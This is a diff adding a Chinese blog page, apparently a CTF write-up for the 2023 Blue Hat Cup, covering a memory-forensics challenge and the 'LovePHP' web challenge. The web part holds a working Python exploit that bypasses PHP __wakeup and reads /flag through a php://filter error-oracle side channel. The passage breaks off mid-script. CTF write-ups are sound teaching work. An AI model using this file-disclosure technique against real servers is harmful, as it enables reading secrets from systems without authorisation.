@@ -1,0 +1,1086 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+  <head>
+    
+    <script type="application/ld+json">
+
+{  
+  "@context":"http://schema.org",
+  "@type":"Website",
+  "@id":"https:\/\/gkjzjh146.github.io\/",
+  "author": {
+    "@type": "Person",
+    "name": "gkjzjh146",
+    
+    "image": "https://gkjzjh146.github.io/images/1.jpg"
+    
+  },
+  "name":"gkjzjh146",
+  "description":"",
+  "url":"https:\/\/gkjzjh146.github.io\/post\/2023%E8%93%9D%E5%B8%BDctf\/",
+  "keywords":"[wp]"
+}
+
+</script>
+    <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="generator" content="Hugo 0.115.4 with theme Tranquilpeak 0.5.3-BETA">
+<meta name="author" content="gkjzjh146">
+<meta name="keywords" content="wp">
+<meta name="description" content="">
+
+
+<meta property="og:description" content="">
+<meta property="og:type" content="article">
+<meta property="og:title" content="【2023蓝帽】WEB&amp;MISC部分WP">
+<meta name="twitter:title" content="【2023蓝帽】WEB&amp;MISC部分WP">
+<meta property="og:url" content="https://gkjzjh146.github.io/post/2023%E8%93%9D%E5%B8%BDctf/">
+<meta property="twitter:url" content="https://gkjzjh146.github.io/post/2023%E8%93%9D%E5%B8%BDctf/">
+<meta property="og:site_name" content="gkjzjh146">
+<meta property="og:description" content="">
+<meta name="twitter:description" content="">
+<meta property="og:locale" content="zh-cn">
+
+  
+    <meta property="article:published_time" content="2023-08-28T07:01:31">
+  
+  
+    <meta property="article:modified_time" content="2023-08-28T07:01:31">
+  
+  
+  
+    
+      <meta property="article:section" content="ctf">
+    
+      <meta property="article:section" content="misc">
+    
+      <meta property="article:section" content="web">
+    
+  
+  
+    
+      <meta property="article:tag" content="wp">
+    
+      <meta property="article:tag" content="2023">
+    
+      <meta property="article:tag" content="misc">
+    
+      <meta property="article:tag" content="web">
+    
+      <meta property="article:tag" content="蓝帽">
+    
+  
+
+
+<meta name="twitter:card" content="summary">
+
+
+
+
+
+
+
+  <meta property="og:image" content="https://gkjzjh146.github.io/images/1.jpg">
+  <meta property="twitter:image" content="https://gkjzjh146.github.io/images/1.jpg">
+
+
+
+
+  <meta property="og:image" content="https://gkjzjh146.github.io/4.jpeg">
+  <meta property="twitter:image" content="https://gkjzjh146.github.io/4.jpeg">
+
+
+  <meta property="og:image" content="https://gkjzjh146.github.io/lanmao.png">
+  <meta property="twitter:image" content="https://gkjzjh146.github.io/lanmao.png">
+
+
+    <title>【2023蓝帽】WEB&amp;MISC部分WP</title>
+
+    <link rel="icon" href="https://gkjzjh146.github.io/images/1.jpg">
+    
+
+    
+
+    <link rel="canonical" href="https://gkjzjh146.github.io/post/2023%E8%93%9D%E5%B8%BDctf/">
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <meta name="referrer" content="no-referrer-when-downgrade">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" integrity="sha512-iBBXm8fW90+nuLcSKlbmrPcLa0OT92xO1BIsZ+ywDWZCvqsWgccV3gFoRBv0z+8dLJgyAHIhR35VZc2oM/gI1w==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.css" integrity="sha512-H9jrZiiopUdsLpg94A333EfumgUBpO9MdbxStdeITo+KEIMaNfHNvwyjjDJb+ERPaRS6DpyRlKbvPUasNItRyw==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+    
+    
+    
+    <link rel="stylesheet" href="https://gkjzjh146.github.io/css/style-h6ccsoet3mzkbb0wngshlfbaweimexgqcxj0h5hu4h82olsdzz6wmqdkajm.min.css" />
+    
+    
+
+    
+      
+    
+    
+  </head>
+
+  <body>
+    <div id="blog">
+      <header id="header" data-behavior="4">
+  <i id="btn-open-sidebar" class="fa fa-lg fa-bars"></i>
+  <div class="header-title">
+    <a class="header-title-link" href="https://gkjzjh146.github.io/" aria-label="去首页">gkjzjh146</a>
+  </div>
+  
+    
+      <a class="header-right-picture "
+         href="https://gkjzjh146.github.io/#about" aria-label="打开链接: /#about">
+    
+    
+    
+      
+        <img class="header-picture" src="https://gkjzjh146.github.io/images/1.jpg" alt="作者的图片" />
+      
+    
+    </a>
+  
+</header>
+
+      <nav id="sidebar" data-behavior="4">
+  <div class="sidebar-container">
+    
+      <div class="sidebar-profile">
+        <a href="https://gkjzjh146.github.io/#about" aria-label="阅读有关作者的更多信息">
+          <img class="sidebar-profile-picture" src="https://gkjzjh146.github.io/images/1.jpg" alt="作者的图片" />
+        </a>
+        <h4 class="sidebar-profile-name">gkjzjh146</h4>
+        
+          <h5 class="sidebar-profile-bio">会点web，会点misc</h5>
+        
+      </div>
+    
+    <ul class="sidebar-buttons">
+      
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://gkjzjh146.github.io/" title="Home">
+    
+      <i class="sidebar-button-icon fas fa-lg fa-home" aria-hidden="true"></i>
+      
+      <span class="sidebar-button-desc">首页</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://gkjzjh146.github.io/categories" title="Categories">
+    
+      <i class="sidebar-button-icon fas fa-lg fa-bookmark" aria-hidden="true"></i>
+      
+      <span class="sidebar-button-desc">分类</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://gkjzjh146.github.io/tags" title="Tags">
+    
+      <i class="sidebar-button-icon fas fa-lg fa-tags" aria-hidden="true"></i>
+      
+      <span class="sidebar-button-desc">标签</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://gkjzjh146.github.io/archives" title="Archives">
+    
+      <i class="sidebar-button-icon fas fa-lg fa-archive" aria-hidden="true"></i>
+      
+      <span class="sidebar-button-desc">归档</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://gkjzjh146.github.io/#about" title="About">
+    
+      <i class="sidebar-button-icon fas fa-lg fa-question" aria-hidden="true"></i>
+      
+      <span class="sidebar-button-desc">关于</span>
+    </a>
+  </li>
+
+
+    </ul>
+    <ul class="sidebar-buttons">
+      
+
+    </ul>
+    <ul class="sidebar-buttons">
+      
+
+    </ul>
+  </div>
+</nav>
+
+      
+  <div class="post-header-cover
+              text-center
+              "
+       style="background-image:url('/4.jpeg')"
+       data-behavior="4">
+    
+      <div class="post-header main-content-wrap text-center">
+  
+    <h1 class="post-title">
+      【2023蓝帽】WEB&amp;MISC部分WP
+    </h1>
+  
+  
+  <div class="postShorten-meta post-meta">
+    
+      <time datetime="2023-08-28T07:01:31&#43;08:00">
+        
+  八月 28, 2023
+
+      </time>
+    
+    
+  
+  
+    <span>发布在</span>
+    
+      <a class="category-link" href="https://gkjzjh146.github.io/categories/ctf">ctf</a>, 
+    
+      <a class="category-link" href="https://gkjzjh146.github.io/categories/misc">misc</a>, 
+    
+      <a class="category-link" href="https://gkjzjh146.github.io/categories/web">web</a>
+    
+  
+
+  </div>
+
+</div>
+    
+  </div>
+
+
+      <div id="main" data-behavior="4"
+        class="hasCover
+               hasCoverMetaIn
+               ">
+        <article class="post" id="top">
+          
+          
+          <div class="post-content markdown">
+            <div class="main-content-wrap">
+              <h1 id="table-of-contents">目录</h1>
+<nav id="TableOfContents">
+  <ul>
+    <li><a href="#misc">MISC</a>
+      <ul>
+        <li><a href="#ez_forensics">ez_Forensics</a></li>
+      </ul>
+    </li>
+    <li><a href="#web">WEB</a>
+      <ul>
+        <li><a href="#lovephp">LovePHP</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+
+<h1 id="misc">MISC</h1>
+<h2 id="ez_forensics">ez_Forensics</h2>
+<p>内存取证，先看看desktop有什么</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-basic" data-lang="basic"><span style="display:flex;"><span>volatility <span style="color:#f92672">-</span>f mem<span style="color:#f92672">.</span>raw <span style="color:#f92672">--</span>profile<span style="color:#f92672">=</span>Win7SP1x64 filescan <span style="color:#f92672">&gt;</span>file<span style="color:#f92672">.</span>txt
+</span></span></code></pre></div><p><img src="https://gkjzjh146.github.io/%E3%80%902023%E8%93%9D%E5%B8%BD%E3%80%91ctf.assets/image-20230828070310640.png" alt="image-20230828070310640"></p>
+<p><img src="https://gkjzjh146.github.io/%E3%80%902023%E8%93%9D%E5%B8%BD%E3%80%91ctf.assets/image-20230828070338859.png" alt="image-20230828070338859"></p>
+<p>看到个readme.txt和table.zip,导出来</p>
+<p>readme.txt这里提示说要明文攻击，但要自己找明文</p>
+<p><img src="https://gkjzjh146.github.io/%E3%80%902023%E8%93%9D%E5%B8%BD%E3%80%91ctf.assets/image-20230828070350082.png" alt="image-20230828070350082"></p>
+<p>可以用editbox</p>
+<p><img src="https://gkjzjh146.github.io/%E3%80%902023%E8%93%9D%E5%B8%BD%E3%80%91ctf.assets/image-20230828070404954.png" alt="image-20230828070404954"></p>
+<p><img src="https://gkjzjh146.github.io/%E3%80%902023%E8%93%9D%E5%B8%BD%E3%80%91ctf.assets/image-20230828070415073.png" alt="image-20230828070415073"></p>
+<p>明文攻击一下</p>
+<p>拿到一张图片</p>
+<p><img src="https://gkjzjh146.github.io/%E3%80%902023%E8%93%9D%E5%B8%BD%E3%80%91ctf.assets/image-20230828070428869.png" alt="image-20230828070428869"></p>
+<p>用passware可以弄出一半flag</p>
+<p><img src="https://gkjzjh146.github.io/%E3%80%902023%E8%93%9D%E5%B8%BD%E3%80%91ctf.assets/image-20230828070443776.png" alt="image-20230828070443776"></p>
+<p>在镜像里面可以找到一个密文</p>
+<p><img src="https://gkjzjh146.github.io/%E3%80%902023%E8%93%9D%E5%B8%BD%E3%80%91ctf.assets/image-20230828070507912.png" alt="image-20230828070507912"></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-basic" data-lang="basic"><span style="display:flex;"><span>SECRET<span style="color:#f92672">=</span>U2FsdGVkX19dHyROKCNrT5BAJk9asDpaZ8L45vr9s9D2Yi9<span style="color:#f92672">/</span>OX5Xl6lEmhd0VoietsmeiLHJjPPG0uSsdxGgr2jzQ00FEMf<span style="color:#f92672">/</span>VglaSrhwumM<span style="color:#f92672">=</span>
+</span></span></code></pre></div><p>再回去看文件，看到一个鼠标记录exe，导出来</p>
+<p><img src="https://gkjzjh146.github.io/%E3%80%902023%E8%93%9D%E5%B8%BD%E3%80%91ctf.assets/image-20230828070544450.png" alt="image-20230828070544450"></p>
+<p>测试可知，它的存储文件是rsmr结尾的，在desktop目录也能找到</p>
+<p><img src="https://gkjzjh146.github.io/%E3%80%902023%E8%93%9D%E5%B8%BD%E3%80%91ctf.assets/image-20230828070558548.png" alt="image-20230828070558548"></p>
+<p>导出，重复一下，弄个画图让它画</p>
+<p><img src="https://gkjzjh146.github.io/%E3%80%902023%E8%93%9D%E5%B8%BD%E3%80%91ctf.assets/image-20230828070609244.png" alt="image-20230828070609244"></p>
+<p>结合table那张图片可以知道密钥是</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-basic" data-lang="basic"><span style="display:flex;"><span>a91e37bf
+</span></span></code></pre></div><p><img src="https://gkjzjh146.github.io/%E3%80%902023%E8%93%9D%E5%B8%BD%E3%80%91ctf.assets/image-20230828070620433.png" alt="image-20230828070620433"></p>
+<h1 id="web">WEB</h1>
+<h2 id="lovephp">LovePHP</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span> 
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Saferman</span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $check <span style="color:#f92672">=</span> <span style="color:#66d9ef">True</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __destruct(){
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">check</span> <span style="color:#f92672">===</span> <span style="color:#66d9ef">True</span>){
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">file</span>($_GET[<span style="color:#e6db74">&#39;secret&#39;</span>]);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __wakeup(){
+</span></span><span style="display:flex;"><span>        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">check</span><span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#39;my_secret.flag&#39;</span>])){
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">unserialize</span>($_GET[<span style="color:#e6db74">&#39;my_secret.flag&#39;</span>]);
+</span></span><span style="display:flex;"><span>}<span style="color:#66d9ef">else</span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">highlight_file</span>(<span style="color:#66d9ef">__FILE__</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>基础序列化与反序列化，__wakeup那里 +1绕过 。file()处是侧信道攻击，直接打脚本</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> sys
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> base64 <span style="color:#f92672">import</span> b64decode
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;&#34;&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">THE GRAND IDEA:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">We can use PHP memory limit as an error oracle. Repeatedly applying the convert.iconv.L1.UCS-4LE
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">filter will blow up the string length by 4x every time it is used, which will quickly cause
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">500 error if and only if the string is non empty. So we now have an oracle that tells us if
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">the string is empty.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">THE GRAND IDEA 2:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">The dechunk filter is interesting.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">https://github.com/php/php-src/blob/01b3fc03c30c6cb85038250bb5640be3a09c6a32/ext/standard/filters.c#L1724
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">It looks like it was implemented for something http related, but for our purposes, the interesting
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">behavior is that if the string contains no newlines, it will wipe the entire string if and only if
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">the string starts with A-Fa-f0-9, otherwise it will leave it untouched. This works perfect with our
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">above oracle! In fact we can verify that since the flag starts with D that the filter chain
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">dechunk|convert.iconv.L1.UCS-4LE|convert.iconv.L1.UCS-4LE|[...]|convert.iconv.L1.UCS-4LE
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">does not cause a 500 error.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">THE REST:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">So now we can verify if the first character is in A-Fa-f0-9. The rest of the challenge is a descent
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">into madness trying to figure out ways to:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">- somehow get other characters not at the start of the flag file to the front
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">- detect more precisely which character is at the front
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">join</span>(<span style="color:#f92672">*</span>x):
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;|&#39;</span><span style="color:#f92672">.</span>join(x)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">err</span>(s):
+</span></span><span style="display:flex;"><span>	print(s)
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">raise</span> <span style="color:#a6e22e">ValueError</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">req</span>(s):
+</span></span><span style="display:flex;"><span>    kuohao <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{}</span><span style="color:#e6db74">&#39;</span>
+</span></span><span style="display:flex;"><span>    data <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>kuohao<span style="color:#e6db74">}</span><span style="color:#e6db74">&amp;secret=php://filter/</span><span style="color:#e6db74">{</span>s<span style="color:#e6db74">}</span><span style="color:#e6db74">/resource=/flag&#39;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> requests<span style="color:#f92672">.</span>get(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;http://123.57.73.24:43553/index.php?my[secret.flag=C:8:&#34;Saferman&#34;:0:</span><span style="color:#e6db74">{</span>data<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)<span style="color:#f92672">.</span>status_code <span style="color:#f92672">==</span> <span style="color:#ae81ff">500</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;&#34;&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Step 1:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">The second step of our exploit only works under two conditions:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">- String only contains a-zA-Z0-9
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">- String ends with two equals signs
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">base64-encoding the flag file twice takes care of the first condition.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">We don&#39;t know the length of the flag file, so we can&#39;t be sure that it will end with two equals
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">signs.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Repeated application of the convert.quoted-printable-encode will only consume additional
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">memory if the base64 ends with equals signs, so that&#39;s what we are going to use as an oracle here.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">If the double-base64 does not end with two equals signs, we will add junk data to the start of the
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">flag with convert.iconv..CSISO2022KR until it does.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>blow_up_enc <span style="color:#f92672">=</span> join(<span style="color:#f92672">*</span>[<span style="color:#e6db74">&#39;convert.quoted-printable-encode&#39;</span>]<span style="color:#f92672">*</span><span style="color:#ae81ff">1000</span>)
+</span></span><span style="display:flex;"><span>blow_up_utf32 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;convert.iconv.L1.UCS-4LE&#39;</span>
+</span></span><span style="display:flex;"><span>blow_up_inf <span style="color:#f92672">=</span> join(<span style="color:#f92672">*</span>[blow_up_utf32]<span style="color:#f92672">*</span><span style="color:#ae81ff">50</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>header <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;convert.base64-encode|convert.base64-encode&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Start get baseline blowup</span>
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#39;Calculating blowup&#39;</span>)
+</span></span><span style="display:flex;"><span>baseline_blowup <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> n <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">100</span>):
+</span></span><span style="display:flex;"><span>	payload <span style="color:#f92672">=</span> join(<span style="color:#f92672">*</span>[blow_up_utf32]<span style="color:#f92672">*</span>n)
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> req(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>header<span style="color:#e6db74">}</span><span style="color:#e6db74">|</span><span style="color:#e6db74">{</span>payload<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>):
+</span></span><span style="display:flex;"><span>		baseline_blowup <span style="color:#f92672">=</span> n
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">break</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>	err(<span style="color:#e6db74">&#39;something wrong&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;baseline blowup is </span><span style="color:#e6db74">{</span>baseline_blowup<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>trailer <span style="color:#f92672">=</span> join(<span style="color:#f92672">*</span>[blow_up_utf32]<span style="color:#f92672">*</span>(baseline_blowup<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">assert</span> req(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>header<span style="color:#e6db74">}</span><span style="color:#e6db74">|</span><span style="color:#e6db74">{</span>trailer<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>) <span style="color:#f92672">==</span> <span style="color:#66d9ef">False</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#39;detecting equals&#39;</span>)
+</span></span><span style="display:flex;"><span>j <span style="color:#f92672">=</span> [
+</span></span><span style="display:flex;"><span>	req(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;convert.base64-encode|convert.base64-encode|</span><span style="color:#e6db74">{</span>blow_up_enc<span style="color:#e6db74">}</span><span style="color:#e6db74">|</span><span style="color:#e6db74">{</span>trailer<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>),
+</span></span><span style="display:flex;"><span>	req(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;convert.base64-encode|convert.iconv..CSISO2022KR|convert.base64-encode</span><span style="color:#e6db74">{</span>blow_up_enc<span style="color:#e6db74">}</span><span style="color:#e6db74">|</span><span style="color:#e6db74">{</span>trailer<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>),
+</span></span><span style="display:flex;"><span>	req(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;convert.base64-encode|convert.iconv..CSISO2022KR|convert.iconv..CSISO2022KR|convert.base64-encode|</span><span style="color:#e6db74">{</span>blow_up_enc<span style="color:#e6db74">}</span><span style="color:#e6db74">|</span><span style="color:#e6db74">{</span>trailer<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)
+</span></span><span style="display:flex;"><span>]
+</span></span><span style="display:flex;"><span>print(j)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> sum(j) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">2</span>:
+</span></span><span style="display:flex;"><span>	err(<span style="color:#e6db74">&#39;something wrong&#39;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> j[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">==</span> <span style="color:#66d9ef">False</span>:
+</span></span><span style="display:flex;"><span>	header <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;convert.base64-encode|convert.iconv..CSISO2022KR|convert.base64-encode&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">elif</span> j[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">==</span> <span style="color:#66d9ef">False</span>:
+</span></span><span style="display:flex;"><span>	header <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;convert.base64-encode|convert.iconv..CSISO2022KR|convert.iconv..CSISO2022KRconvert.base64-encode&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">elif</span> j[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">==</span> <span style="color:#66d9ef">False</span>:
+</span></span><span style="display:flex;"><span>	header <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;convert.base64-encode|convert.base64-encode&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>	err(<span style="color:#e6db74">&#39;something wrong&#39;</span>)
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;j: </span><span style="color:#e6db74">{</span>j<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;header: </span><span style="color:#e6db74">{</span>header<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;&#34;&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Step two:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Now we have something of the form
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[a-zA-Z0-9 things]==
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Here the pain begins. For a long time I was trying to find something that would allow me to strip
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">successive characters from the start of the string to access every character. Maybe something like
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">that exists but I couldn&#39;t find it. However, if you play around with filter combinations you notice
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">there are filters that *swap* characters:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">convert.iconv.CSUNICODE.UCS-2BE, which I call r2, flips every pair of characters in a string:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">abcdefgh -&gt; badcfehg
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">convert.iconv.UCS-4LE.10646-1:1993, which I call r4, reverses every chunk of four characters:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">abcdefgh -&gt; dcbahgfe
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">This allows us to access the first four characters of the string. Can we do better? It turns out
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">YES, we can! Turns out that convert.iconv.CSUNICODE.CSUNICODE appends &lt;0xff&gt;&lt;0xfe&gt; to the start of
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">the string:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">abcdefgh -&gt; &lt;0xff&gt;&lt;0xfe&gt;abcdefgh
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">The idea being that if we now use the r4 gadget, we get something like:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">ba&lt;0xfe&gt;&lt;0xff&gt;fedc
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">And then if we apply a convert.base64-decode|convert.base64-encode, it removes the invalid
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&lt;0xfe&gt;&lt;0xff&gt; to get:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">bafedc
